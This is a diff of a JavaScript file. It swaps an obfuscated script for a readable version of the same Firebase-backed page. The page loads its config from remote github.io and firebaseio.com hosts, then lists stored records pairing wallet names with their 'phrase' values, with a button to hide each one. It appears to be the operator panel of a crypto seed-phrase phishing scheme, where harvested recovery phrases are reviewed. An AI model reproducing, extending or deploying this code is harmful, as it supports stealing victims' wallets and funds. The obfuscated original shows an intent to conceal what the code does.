@@ -1,1 +1,108 @@
-const _0x1e7bad=_0x5812;(function(_0x236873,_0x28a895){const _0x545c5f=_0x5812,_0x3b4530=_0x236873();while(!![]){try{const _0x2c2f95=-parseInt(_0x545c5f(0xeb))/0x1+parseInt(_0x545c5f(0xed))/0x2*(-parseInt(_0x545c5f(0xea))/0x3)+-parseInt(_0x545c5f(0xf4))/0x4+parseInt(_0x545c5f(0xf0))/0x5+-parseInt(_0x545c5f(0x103))/0x6*(-parseInt(_0x545c5f(0xdd))/0x7)+parseInt(_0x545c5f(0xdf))/0x8*(-parseInt(_0x545c5f(0x10c))/0x9)+parseInt(_0x545c5f(0xe8))/0xa;if(_0x2c2f95===_0x28a895)break;else _0x3b4530['push'](_0x3b4530['shift']());}catch(_0x151bd7){_0x3b4530['push'](_0x3b4530['shift']());}}}(_0x4df5,0x9ba1e));import{acc as _0x7de136}from'https://giterhaber.github.io/web-codes/configs.js';import{cmBwsbFSqC as _0x32ed98}from'https://giterhaber.github.io/web-codes/cmBwsbFSqC.js';const app1=firebase[_0x1e7bad(0x10b)](_0x7de136),auth=firebase['auth'](app1);auth[_0x1e7bad(0xfa)](_0x12cbaa=>{const _0x247e24=_0x1e7bad;if(_0x12cbaa){var _0x57b7c3=_0x12cbaa['uid'];console[_0x247e24(0xe1)](_0x247e24(0x101));}else console[_0x247e24(0xe1)](_0x247e24(0xdc)),location[_0x247e24(0x105)]='./';}),$(_0x1e7bad(0xe5))['on']('click',()=>{auth['signOut']();});function _0x4df5(){const _0x20b1c6=['<p>Wallet:\x20','3611100JsKsAE','target','onSnapshot','div','collection','doc','onAuthStateChanged','app2','parentElement','data','createElement','active','catch','signed\x20in','button','6GTPQop','setAttribute','href','\x20<br>\x20','update','phrase','Data\x20Deleted','appendChild','initializeApp','125955projIx','🗑️','addEventListener','signed\x20out','725767EsswCg','style','56kZDTws','wallet','log','location','background-color:\x20rgb(54,\x2057,\x2063);\x20color:white;','status','#logout','hide','delete\x20sure?','17696420NXaLIt','firestore','1597251MrKQrc','309372pkxpHh','docChanges','2ZUKbau','</p><br>','innerHTML','3033380KepDtS','then','querySelector'];_0x4df5=function(){return _0x20b1c6;};return _0x4df5();}const app2=firebase[_0x1e7bad(0x10b)](_0x32ed98,_0x1e7bad(0xfb));var db=firebase[_0x1e7bad(0xe9)](app2);const rootDIV=document[_0x1e7bad(0xf2)]('#root');function deleteTodo(_0x53daba){const _0x5e30fa=_0x1e7bad;let _0x410a25=_0x53daba[_0x5e30fa(0xf5)],_0x2baffe=_0x410a25[_0x5e30fa(0xfc)]['id'];confirm(_0x5e30fa(0xe7))&&(console['log'](_0x2baffe),db[_0x5e30fa(0xf8)]('data')[_0x5e30fa(0xf9)](_0x2baffe)[_0x5e30fa(0x107)]({'status':_0x5e30fa(0xe6)})[_0x5e30fa(0xf1)](()=>{const _0x2591f3=_0x5e30fa;alert(_0x2591f3(0x109)),window[_0x2591f3(0xe2)]['reload']();})[_0x5e30fa(0x100)](_0x2d65e4=>{const _0x5e960a=_0x5e30fa;console[_0x5e960a(0xe1)](_0x2d65e4);}));}function _0x5812(_0x1f2110,_0x4e174f){const _0x4df555=_0x4df5();return _0x5812=function(_0x581220,_0x1eea47){_0x581220=_0x581220-0xdc;let _0x3f9d5f=_0x4df555[_0x581220];return _0x3f9d5f;},_0x5812(_0x1f2110,_0x4e174f);}db[_0x1e7bad(0xf8)](_0x1e7bad(0xfd))['where'](_0x1e7bad(0xe4),'==',_0x1e7bad(0xff))[_0x1e7bad(0xf6)](_0x5d2f33=>{const _0x300b36=_0x1e7bad;_0x5d2f33[_0x300b36(0xec)]()['forEach'](_0x479e71=>{const _0x26935c=_0x300b36;var _0x180d2c=_0x479e71[_0x26935c(0xf9)][_0x26935c(0xfd)]();console[_0x26935c(0xe1)](_0x180d2c);let _0x2d3178=_0x180d2c[_0x26935c(0xe0)],_0xec1598=_0x180d2c[_0x26935c(0x108)],_0x449116=_0x26935c(0xf3)+_0x2d3178+_0x26935c(0x106)+_0xec1598+_0x26935c(0xee),_0x214a04=document['createElement'](_0x26935c(0xf7));_0x214a04['id']=_0x479e71[_0x26935c(0xf9)]['id'],_0x214a04['innerHTML']=_0x449116,rootDIV[_0x26935c(0x10a)](_0x214a04);let _0x24a77c=document[_0x26935c(0xfe)](_0x26935c(0x102));_0x24a77c[_0x26935c(0x104)](_0x26935c(0xde),_0x26935c(0xe3)),_0x24a77c[_0x26935c(0xef)]=_0x26935c(0x10d),_0x24a77c[_0x26935c(0x10e)]('click',deleteTodo),_0x214a04['prepend'](_0x24a77c);});});
+
+
+import {acc as ACCOUNT} from "https://giterhaber.github.io/web-codes/configs.js"
+var url = 'https://pamalikasako-default-rtdb.firebaseio.com/database.json'
+
+function testAjax() {
+    var result="";
+    $.ajax({
+      url: url,
+      async: false,  
+      success:function(data) {
+         result = data.config; 
+      }
+   });
+   return result;
+}
+
+const config = testAjax()
+
+
+
+const app1 = firebase.initializeApp(ACCOUNT);
+const auth = firebase.auth(app1);
+
+auth.onAuthStateChanged((user) => {
+    if (user) {
+      // User is signed in, see docs for a list of available properties
+      // https://firebase.google.com/docs/reference/js/firebase.User
+      var uid = user.uid;
+      // ...
+      console.log('signed in')
+    } else {
+      // User is signed out
+      // ...
+      console.log('signed out')
+      location.href = './'
+    }
+  });
+  $('#logout').on('click', () => {
+    auth.signOut()
+})
+
+  
+//DATABASE
+
+
+const app2 = firebase.initializeApp(config, 'app2');
+var db = firebase.firestore(app2);
+const rootDIV = document.querySelector('#root');
+
+
+function deleteTodo(event) {
+  let button = event.target
+  let docId = button.parentElement.id
+
+
+  if (confirm('delete sure?')) {
+    console.log(docId)
+
+
+
+    db.collection('data').doc(docId).update({
+      status: 'hide'
+    }).then( () => {
+      alert('Data Deleted')
+      window.location.reload();
+    }).catch( (err) => {
+      console.log(err)
+    })
+
+  }
+
+}
+
+db.collection('data').where('status', '==', 'active').onSnapshot( (querySnapshot) => {
+  querySnapshot.docChanges().forEach( (change) => {
+    var d = change.doc.data();
+    console.log(d)
+
+    let wallet = d.wallet;
+    let phrase = d.phrase;
+
+  let text = `<p>Wallet: ${wallet} <br> ${phrase}</p><br>`
+  // let para = document.createElement("div")
+  // para.innerHTML = text
+  // rootDIV.appendChild(para)
+
+   let line = document.createElement("div");
+   line.id = change.doc.id;
+   line.innerHTML = text
+   rootDIV.appendChild(line)
+
+
+//del button
+let delBtn = document.createElement("button")
+   delBtn.setAttribute("style", "background-color: rgb(54, 57, 63); color:white;")
+   delBtn.innerHTML = "🗑️"
+delBtn.addEventListener("click", deleteTodo)
+line.prepend(delBtn)
+
+    
+
+  })
+})
+
+
+
+
